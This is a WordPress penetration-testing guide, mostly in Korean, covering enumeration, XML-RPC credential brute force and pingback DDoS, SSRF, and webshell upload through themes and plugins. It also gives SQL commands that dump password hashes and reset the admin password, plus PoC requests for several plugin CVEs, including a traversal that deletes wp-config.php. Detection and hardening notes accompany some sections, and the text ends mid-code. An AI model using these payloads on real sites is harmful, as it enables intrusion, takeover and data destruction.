# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## 기본 정보

- **Uploaded** 파일은 다음 위치로 업로드됩니다: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** 따라서 테마의 일부 php를 변경하여 RCE를 얻으려는 경우 해당 경로를 사용하게 됩니다. 예를 들어: **theme twentytwelve**를 사용하면 [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)에서 **404.php** 파일에 접근할 수 있습니다.

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- `wp-config.php` 파일에서 데이터베이스의 루트 비밀번호를 찾을 수 있습니다.
- 확인해야 할 기본 로그인 경로: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt`에는 설치된 WordPress 버전 등 유용한 정보가 들어있습니다.
- `wp-activate.php`는 새로운 WordPress 사이트를 설정할 때 이메일 활성화 과정에 사용됩니다.
- 로그인 폴더들(숨기기 위해 이름이 변경되었을 수 있음):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php`는 HTTP를 전송 메커니즘으로, XML을 인코딩 메커니즘으로 사용하여 데이터를 전송할 수 있게 해주는 WordPress의 기능을 나타내는 파일입니다. 이러한 유형의 통신은 WordPress [REST API](https://developer.wordpress.org/rest-api/reference)로 대체되었습니다.
- `wp-content` 폴더는 플러그인과 테마가 저장되는 주요 디렉토리입니다.
- `wp-content/uploads/`는 플랫폼에 업로드된 모든 파일이 저장되는 디렉토리입니다.
- `wp-includes/`는 인증서, 글꼴, JavaScript 파일, 위젯 등 핵심 파일들이 저장되는 디렉토리입니다.
- `wp-sitemap.xml` WordPress 버전 5.5 이상에서는 공개 게시물과 공개적으로 쿼리 가능한 포스트 타입 및 분류법을 모두 포함하는 sitemap XML 파일을 생성합니다.

**Post exploitation**

- `wp-config.php` 파일에는 WordPress가 데이터베이스에 연결하는 데 필요한 데이터베이스 이름, 데이터베이스 호스트, 사용자 이름 및 비밀번호, 인증 키 및 솔트, 데이터베이스 테이블 접두사 등의 정보가 들어 있습니다. 이 구성 파일은 또한 문제 해결에 유용할 수 있는 DEBUG 모드를 활성화하는 데에도 사용될 수 있습니다.

### 사용자 권한

- **Administrator**
- **Editor**: 자신의 글과 다른 사람의 글을 발행하고 관리합니다.
- **Author**: 자신의 글을 발행하고 관리합니다.
- **Contributor**: 글을 작성하고 관리할 수 있으나 발행할 수 없습니다.
- **Subscriber**: 게시물을 탐색하고 자신의 프로필을 편집합니다.

## **Passive Enumeration**

### **WordPress 버전 확인**

파일 `/license.txt` 또는 `/readme.html`을 찾을 수 있는지 확인하세요.

페이지의 **소스 코드** 내에서 (예: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS 링크 파일

![](<../../images/image (533).png>)

- JavaScript 파일

![](<../../images/image (524).png>)

### 플러그인 가져오기
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### 테마 가져오기
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### 일반적인 버전 추출
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## 능동적 열거

### 플러그인 및 테마

아마 모든 플러그인과 테마를 찾을 수는 없을 것입니다. 모두를 발견하려면 **actively Brute Force a list of Plugins and Themes** 해야 합니다(다행히 이러한 목록을 포함한 자동화 도구들이 있습니다).

### 사용자

- **ID Brute:** WordPress 사이트에서 사용자 ID를 Brute Forcing하여 유효한 사용자를 얻습니다:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
응답이 **200** 또는 **30X**이면 해당 id는 **유효**합니다. 응답이 **400**이면 해당 id는 **무효**입니다.

- **wp-json:** 사용자 정보를 쿼리하여 얻어볼 수도 있습니다:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
사용자에 대한 일부 정보를 노출할 수 있는 또 다른 `/wp-json/` endpoint는 다음과 같습니다:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **이 기능을 활성화한 사용자에 대한 정보만 제공됩니다**.

또한 **/wp-json/wp/v2/pages**가 IP 주소를 leak할 수 있다는 점에 유의하세요.

- **Login username enumeration**: 로그인 시 **`/wp-login.php`**의 **메시지**가 **다르게 표시되어** **사용자 이름의 존재 여부**를 알려줍니다.

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (예: 이 과정을 자동화하려면[ using this](https://github.com/relarizky/wpxploit)을 사용할 수 있습니다).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**확인**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** 또는 **`metaWeblog.getUsersBlogs`** 은(는) brute-force credentials에 사용할 수 있는 메서드들입니다. 이들 중 하나를 찾을 수 있다면 다음과 같이 보낼 수 있습니다:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
200 코드 응답 안에 _"Incorrect username or password"_ 메시지가 나타나야 하며, 자격 증명이 유효하지 않을 경우 표시됩니다.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

올바른 자격 증명을 사용하면 파일을 업로드할 수 있습니다. 응답에는 경로가 표시됩니다 ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
또한 **더 빠른 방법**이 있는데, 동일한 요청에서 여러 자격 증명을 시도할 수 있으므로 **`system.multicall`**을 사용해 자격 증명을 브루트포스할 수 있습니다:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

이 방법은 사람용이 아니라 프로그램용이며 오래된 방식이라 2FA를 지원하지 않습니다. 따라서 유효한 자격 증명이 있지만 메인 로그인에 2FA가 설정되어 있다면, **xmlrpc.php를 악용하여 해당 자격 증명으로 2FA를 우회해 로그인할 수 있을지도 모릅니다**. 콘솔을 통해 할 수 있는 모든 동작을 수행할 수는 없지만, Ippsec가 [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)에서 설명하는 것처럼 여전히 RCE에 도달할 수 있을 수도 있습니다.

**DDoS or port scanning**

목록에서 _**pingback.ping**_ 메서드를 찾을 수 있다면 Wordpress가 임의의 호스트/포트로 요청을 보내도록 만들 수 있습니다.\
이를 이용해 **수천**개의 Wordpress **사이트들**에 한 **대상**에 접속하도록 요청할 수 있으므로 그 대상에 **DDoS**가 발생하게 만들 수 있으며, 또는 이를 사용해 **Wordpress**로 내부 **네트워크**를 **스캔**하게 할 수도 있습니다(임의의 포트를 지정할 수 있습니다).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

**faultCode**의 값이 **0** (17)보다 **큰** 경우, 포트가 열려 있다는 의미입니다.

이전 섹션에서 **`system.multicall`**의 사용을 살펴보면 이 메서드를 악용하여 DDoS를 유발하는 방법을 배울 수 있습니다.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

이 파일은 일반적으로 Wordpress 사이트의 루트에 존재합니다: **`/wp-cron.php`**\
이 파일이 **접근될 때** **무거운** MySQL **쿼리**가 실행되므로, **공격자**가 **DoS**를 **유발**하는 데 사용할 수 있습니다.\
또한, 기본적으로, `wp-cron.php`는 모든 페이지 로드 시(클라이언트가 어떤 Wordpress 페이지를 요청할 때마다) 호출되며, 트래픽이 많은 사이트에서는 문제가 될 수 있습니다 (DoS).

Wp-Cron을 비활성화하고 호스트 내에서 실제 cronjob을 생성해 정기적으로 필요한 작업을 수행하도록 하는 것이 권장됩니다 (문제 없이).

### /wp-json/oembed/1.0/proxy - SSRF

다음 URL에 접근해 보세요: _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ 그리고 Worpress 사이트가 당신에게 요청을 보낼 수 있습니다.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

이 도구는 **methodName: pingback.ping**과 경로 **/wp-json/oembed/1.0/proxy**가 있는지 확인하고, 존재하면 이를 악용하려 시도합니다.

## 자동 도구
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## 비트 하나 덮어써서 접근하기

실제 공격이라기보다는 호기심에 가깝다. 해당 CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man)에서는 어떤 wordpress 파일에서든 1비트를 뒤집을 수 있었다. 따라서 파일 `/var/www/html/wp-includes/user.php`의 위치 `5389`의 비트를 뒤집어 NOT (`!`) 연산을 NOP로 만들 수 있었다.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**사용 중인 테마의 php 수정 (admin credentials needed)**

Appearance → Theme Editor → 404 Template (오른쪽)

php shell용으로 내용을 변경:

![](<../../images/image (384).png>)

업데이트된 페이지에 어떻게 접근하는지 인터넷에서 검색하세요. 이 경우 다음 위치에 접근해야 합니다: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

다음을 사용할 수 있습니다:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
세션을 얻기 위해.

## Plugin RCE

### PHP plugin

It may be possible to upload .php files as a plugin.\
Create your php backdoor using for example:

![](<../../images/image (183).png>)

Then add a new plugin:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

Probably this won't do anything apparently, but if you go to Media, you will see your shell uploaded:

![](<../../images/image (462).png>)

Access it and you will see the URL to execute the reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

이 방법은 취약한 것으로 알려진 악성 plugin을 설치하여 web shell을 획득하는 방법입니다. 이 과정은 WordPress dashboard를 통해 다음과 같이 수행됩니다:

1. **Plugin Acquisition**: 플러그인은 Exploit DB와 같은 출처에서 [**here**](https://www.exploit-db.com/exploits/36374)처럼 얻습니다.
2. **Plugin Installation**:
- WordPress dashboard에서 `Dashboard > Plugins > Upload Plugin`으로 이동합니다.
- 다운로드한 plugin의 zip file을 업로드합니다.
3. **Plugin Activation**: plugin이 성공적으로 설치되면 dashboard에서 활성화해야 합니다.
4. **Exploitation**:
- "reflex-gallery" plugin이 설치되고 활성화되면, 해당 plugin은 취약한 것으로 알려져 있어 이를 이용해 공격할 수 있습니다.
- Metasploit framework는 이 취약점에 대한 exploit를 제공합니다. 적절한 모듈을 로드하고 특정 명령을 실행하면 meterpreter session을 획득하여 사이트에 무단 접근할 수 있습니다.
- 이는 WordPress 사이트를 악용할 수 있는 여러 방법 중 하나에 불과합니다.

해당 내용에는 plugin을 설치하고 활성화하는 WordPress dashboard 단계들을 보여주는 시각적 자료가 포함되어 있습니다. 그러나 이러한 방식으로 취약점을 악용하는 것은 적절한 승인 없이 불법적이며 비윤리적임을 유의해야 합니다. 이 정보는 책임감 있게, 명시적 허가가 있는 법적 맥락(예: penetration testing)에서만 사용되어야 합니다.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). It provides **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ WordPress에 사용자를 생성합니다.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ 커스텀 plugin(backdoor)을 WordPress에 업로드합니다.
- _**(RCE) Built-In Plugin Edit:**_ WordPress의 내장 플러그인을 편집합니다.
- _**(RCE) Built-In Theme Edit:**_ WordPress의 내장 테마를 편집합니다.
- _**(Custom) Custom Exploits:**_ 서드파티 WordPress Plugins/Themes용 커스텀 Exploits를 제공합니다.

## Post Exploitation

Extract usernames and passwords:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
관리자 비밀번호 변경:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress 플러그인 Pentest

### Attack Surface

Wordpress 플러그인이 기능을 어떻게 노출하는지 아는 것은 해당 기능에서 취약점을 찾는 데 핵심입니다. 플러그인이 기능을 노출하는 방법은 다음 글머리표에서 확인할 수 있으며, 취약한 플러그인의 예시는 [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/)에 있습니다.

- **`wp_ajax`**

플러그인이 함수를 사용자에게 노출하는 방법 중 하나는 AJAX 핸들러를 통한 것입니다. 이들 핸들러에는 로직, authorization, 또는 authentication 버그가 포함될 수 있습니다. 게다가 이러한 함수들이 authentication과 authorization을 wordpress nonce의 존재 여부에 기반하는 경우가 꽤 자주 있으며, 이 nonce는 **any user authenticated in the Wordpress instance might have** (역할과 무관하게).

These are the functions that can be used to expose a function in a plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv`를 사용하면 엔드포인트가 모든 사용자(심지어 인증되지 않은 사용자)도 접근할 수 있게 됩니다.**

> [!CAUTION]
> 또한, 만약 해당 함수가 사용자 권한을 `wp_verify_nonce` 함수로만 확인한다면, 이 함수는 단지 사용자가 로그인되어 있는지 여부만 확인할 뿐 보통 사용자 역할(role)을 확인하지 않습니다. 따라서 권한이 낮은 사용자가 권한이 높은 작업에 접근할 수 있습니다.

- **REST API**

또한 `register_rest_route` 함수를 사용해 wordpress에서 REST API를 등록하여 함수를 노출시키는 것도 가능합니다:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback`은(는) 주어진 사용자가 API 메서드를 호출할 권한이 있는지 확인하는 콜백 함수입니다.

**내장된 `__return_true` 함수가 사용되면 사용자 권한 검사를 단순히 건너뜁니다.**

- **php 파일에 대한 직접 접근**

물론 Wordpress는 PHP를 사용하며 플러그인 내부의 파일은 웹에서 직접 접근할 수 있습니다. 따라서 플러그인이 파일에 접근하는 것만으로 실행되는 취약한 기능을 노출하고 있다면, 모든 사용자가 이를 악용할 수 있습니다.

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

일부 플러그인은 내부 통합이나 reverse proxies를 위한 "trusted header" 단축 경로를 구현하고, 해당 헤더를 REST 요청의 현재 사용자 컨텍스트를 설정하는 데 사용합니다. 업스트림 컴포넌트가 그 헤더를 요청에 암호학적으로 바인딩하지 않으면 공격자가 이를 스푸핑하여 관리자 권한으로 권한이 있는 REST 라우트에 접근할 수 있습니다.

- Impact: 인증되지 않은 상태에서 core users REST route를 통해 새 관리자 계정을 생성하여 관리자 권한으로 권한 상승이 발생합니다.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (사용자 ID 1을 강제 지정하며, 일반적으로 첫 번째 관리자 계정입니다.)
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works

- 플러그인은 클라이언트가 제어하는 헤더를 인증 상태에 매핑하고 권한 검사를 건너뛴다.
- WordPress core는 이 라우트에 대해 `create_users` capability를 기대한다; 플러그인 해킹은 헤더에서 현재 사용자 컨텍스트를 직접 설정하여 이를 우회한다.

Expected success indicators

- 생성된 사용자를 설명하는 JSON 바디와 함께 HTTP 201.
- 새 관리자 계정이 `wp-admin/users.php`에 표시됨.

Detection checklist

- `getallheaders()`, `$_SERVER['HTTP_...']` 또는 사용자 정의 헤더를 읽어 사용자 컨텍스트를 설정하는 vendor SDK(예: `wp_set_current_user()`, `wp_set_auth_cookie()`)를 grep한다.
- 요청 헤더에 의존하고 강력한 `permission_callback` 검사가 없는 권한 있는 콜백에 대한 REST 등록을 검토한다.
- REST 핸들러 내부에서 헤더 값으로만 제한된 상태로 사용되는 코어 사용자 관리 함수(`wp_insert_user`, `wp_create_user`)의 사용을 찾아본다.

Hardening

- 클라이언트가 제어하는 헤더에서 인증 또는 권한을 유도하지 마라.
- 리버스 프록시가 반드시 신원을 주입해야 하는 경우, 프록시에서 신뢰를 종료하고 수신 복사본을 제거(예: 에지에서 `unset X-Wcpay-Platform-Checkout-User`)한 다음 서명된 토큰을 전달하고 서버 측에서 검증하라.
- 권한 있는 동작을 수행하는 REST 라우트에는 `current_user_can()` 검사와 엄격한 `permission_callback`을 요구하라(절대 `__return_true` 사용 금지).
- 헤더 "impersonation"보다 1st-party 인증(쿠키, application passwords, OAuth)을 선호하라.

References: see the links at the end of this page for a public case and broader analysis.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress 테마와 플러그인은 종종 `wp_ajax_` 및 `wp_ajax_nopriv_` 훅을 통해 AJAX 핸들러를 노출한다. **_nopriv_** 변형이 사용되면 **콜백이 인증되지 않은 방문자에 의해 접근 가능해진다**, 따라서 민감한 동작은 추가로 다음을 구현해야 한다:

1. **권한 검사** (예: `current_user_can()` 또는 최소한 `is_user_logged_in()`), 그리고
2. **CSRF nonce** 를 `check_ajax_referer()` / `wp_verify_nonce()`로 검증, 그리고
3. **엄격한 입력 정화/검증**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
이 스니펫으로 인해 발생하는 문제:

* **Unauthenticated access** – `wp_ajax_nopriv_` 훅이 등록되어 있다.
* **No nonce / capability check** – 어떤 방문자라도 엔드포인트를 호출할 수 있다.
* **No path sanitisation** – 사용자 제어 `fontfamily` 문자열이 필터링 없이 파일시스템 경로에 연결되어 classic `../../` traversal을 허용한다.

#### Exploitation

공격자는 단일 HTTP POST 요청을 보내어 **uploads base directory 이하에 있는** 모든 파일이나 디렉터리(보통 `<wp-root>/wp-content/uploads/`)를 삭제할 수 있다:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### 탐지 체크리스트

* 파일 시스템 헬퍼(`copy()`, `unlink()`, `$wp_filesystem->delete()` 등)를 호출하는 `add_action( 'wp_ajax_nopriv_...')` 콜백.
* 필터링되지 않은 사용자 입력을 경로에 연결하는 경우(`$_POST`, `$_GET`, `$_REQUEST` 등을 확인).
* `check_ajax_referer()` 및 `current_user_can()`/`is_user_logged_in()` 의 부재.

#### 하드닝
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **항상** 디스크에 대한 쓰기/삭제 작업은 권한이 있는 것으로 취급하고 다음을 반드시 재확인하세요:
> • Authentication  • Authorisation  • Nonce  • Input sanitisation  • Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

많은 플러그인은 원래 역할을 user meta에 저장해 나중에 복원할 수 있도록 "view as role" 또는 일시적인 역할 전환 기능을 구현합니다. 복원 경로가 요청 파라미터(예: `$_REQUEST['reset-for']`)와 플러그인이 관리하는 목록에만 의존하고 capabilities 검사와 유효한 nonce를 확인하지 않는다면, 이것은 vertical privilege escalation이 됩니다.

실제 사례는 Admin and Site Enhancements (ASE) 플러그인 (≤ 7.6.2.1)에서 발견되었습니다. reset 분기는 내부 배열 `$options['viewing_admin_as_role_are']`에 사용자명이 존재하면 `reset-for=<username>`에 따라 역할을 복원했으나, 현재 역할을 제거하고 user meta `_asenha_view_admin_as_original_roles`에 저장된 역할을 다시 추가하기 전에 `current_user_can()` 검사나 nonce 검증을 전혀 수행하지 않았습니다:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
왜 악용 가능한가

- 서버 측 권한 확인 없이 `$_REQUEST['reset-for']`와 플러그인 옵션을 신뢰함.
- 사용자가 이전에 `_asenha_view_admin_as_original_roles`에 더 높은 권한이 저장되어 있다가 권한이 강등된 경우, 리셋 경로를 호출하면 해당 권한을 복원할 수 있음.
- 일부 배포에서는, 인증된 어떤 사용자라도 `viewing_admin_as_role_are`에 여전히 남아있는 다른 사용자명에 대한 리셋을 트리거할 수 있음(권한 검증 결함).

공격 전제 조건

- 해당 기능이 활성화된 취약한 플러그인 버전.
- 타깃 계정이 이전 사용으로 인해 user meta에 저장된 오래된 고권한 역할을 보유함.
- 인증된 세션(어떤 것이라도 가능); reset 흐름에서 nonce/capability 검증이 없음.

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
취약한 빌드에서는 이것이 현재 역할을 제거하고 저장된 원래 역할(예: `administrator`)을 다시 추가하여 권한을 상승시킨다.

탐지 체크리스트

- 역할 전환 기능 중 user meta에 “원래 역할”을 유지하는 기능(예: `_asenha_view_admin_as_original_roles`)을 찾아라.
- 다음과 같은 재설정/복원 경로를 식별하라:
- 사용자 이름을 `$_REQUEST` / `$_GET` / `$_POST`에서 읽는다.
- `current_user_can()` 및 `wp_verify_nonce()` / `check_admin_referer()` 없이 `add_role()` / `remove_role()`로 역할을 변경한다.
- 행위자의 capabilities(권한) 대신 플러그인 옵션 배열(예: `viewing_admin_as_role_are`)을 기반으로 권한을 부여하는 것을 식별하라.

보안 강화

- 모든 상태 변경 분기마다 권한 검사를 강제 적용(예: `current_user_can('manage_options')` 또는 더 엄격한 검사).
- 모든 역할/권한 변경에 대해 nonce를 요구하고 검증하라: `check_admin_referer()` / `wp_verify_nonce()`.
- 요청으로 전달된 사용자 이름을 절대 신뢰하지 말고; 인증된 행위자와 명시적 정책에 따라 서버 측에서 대상 사용자를 결정하라.
- 프로필/역할 업데이트 시 “원래 역할” 상태를 무효화하여 오래된 고권한 복원을 방지하라:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- 임시 역할 전환을 위해 최소한의 상태만 저장하고 시간 제한이 있는 capability-guarded 토큰 사용을 고려하세요.

---

### WAF considerations for WordPress/plugin CVEs

Generic edge/server WAFs는 광범위한 패턴(SQLi, XSS, LFI)에 맞춰 튜닝되어 있습니다. 많은 고위험 WordPress/plugin 취약점은 애플리케이션 특화 로직/auth 버그로, 엔진이 WordPress 경로와 플러그인 의미론을 이해하지 못하면 정상 트래픽처럼 보입니다.

Offensive notes

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- Typical high-impact cases: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Don’t rely on generic WAF signatures to protect plugin CVEs. Implement application-layer, vulnerability-specific virtual patches or update quickly.
- Prefer positive-security checks in code (capabilities, nonces, strict input validation) over negative regex filters.

## WordPress Protection

### Regular Updates

Make sure WordPress, plugins, and themes are up to date. Also confirm that automated updating is enabled in wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
또한, **신뢰할 수 있는 WordPress plugins와 themes만 설치하세요**.

### 보안 플러그인

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **기타 권장사항**

- 기본 **admin** 계정 제거
- **강력한 비밀번호**와 **2FA** 사용
- 정기적으로 사용자 **권한**을 **검토**하세요
- **로그인 시도 제한**으로 Brute Force 공격을 방지하세요
- **`wp-admin.php`** 파일명을 변경하고 내부 또는 특정 IP에서만 접근을 허용하세요.


### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

WP Job Portal 채용 플러그인은 **savecategory** 작업을 노출했으며, 이는 궁극적으로 `modules/category/model.php::validateFormData()` 내부에서 다음과 같은 취약한 코드를 실행합니다:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
